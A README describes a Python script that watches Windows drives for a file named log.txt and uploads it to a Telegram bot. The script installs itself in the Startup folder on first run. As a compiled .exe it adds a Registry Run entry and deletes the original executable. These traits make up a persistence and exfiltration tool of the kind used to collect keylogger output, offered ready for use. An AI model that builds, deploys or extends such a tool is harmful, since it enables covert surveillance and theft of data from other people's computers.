# File Monitor to Telegram

A Python script that monitors Windows drives for changes to a specific file (`log.txt`) and sends notifications via Telegram.

## Features

- **Monitors specified Windows drives** (C:, D:, E:, F:, Z:) for file changes
- **Detects file creation and modification events** using `watchdog`
- **Sends file to Telegram** with filename, path, and modification time
- **Self-installs to Windows Startup** - copies itself to startup folder on first run
- **Handles file writing races** - retries up to 5 times waiting for file to stabilize before sending
- **Fallback persistence** - Registry Run entry for compiled .exe files



## Prerequisites

- Python 3.x
- Required packages:
  ```bash
  pip install requests watchdog
  ```

## Configuration

Edit `file_detect.py` and set your configuration:

```python
BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"
TARGET_FILENAME = "log.txt"  # Exact filename to monitor
DRIVES = [  # Windows drives to monitor
    r"C:\\",
    r"D:\\",
    r"E:\\",
    r"F:\\",
    r"Z:\\",
]
```

## Installation

1. **Run the script once** to install it to Windows Startup:
   ```bash
   python file_detect.py
   ```

2. The script will:
   - Copy itself to `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\file_detect.py`
   - Start monitoring drives for `log.txt` changes
   - Send Telegram notifications when the file changes

3. **To stop monitoring**: Press `CTRL+C` in the console

## How It Works

1. **Self-installation**: On first run, the script copies itself to Windows Startup folder so it auto-starts on login
2. **File monitoring**: Uses `watchdog` to monitor specified drives for `Created` and `Modified` events
3. **File stability check**: Before sending to Telegram, waits up to 2 seconds and checks if file size remains constant (means writing is complete)
4. **Retry logic**: Retries up to 5 times if file is still changing
5. **Telegram notification**: Sends a message with file details, then uploads the file as a document

## For Compiled .exe

When compiled with PyInstaller:
- The .exe copies itself to startup as `file_detect.py`
- Creates a Registry Run entry: `python.exe "startup_path\file_detect.py"`
- Deletes the original .exe
- On next Windows login, the Registry Run entry launches Python with the .py copy, which starts monitoring

## License

This project is for personal use. Modify as needed.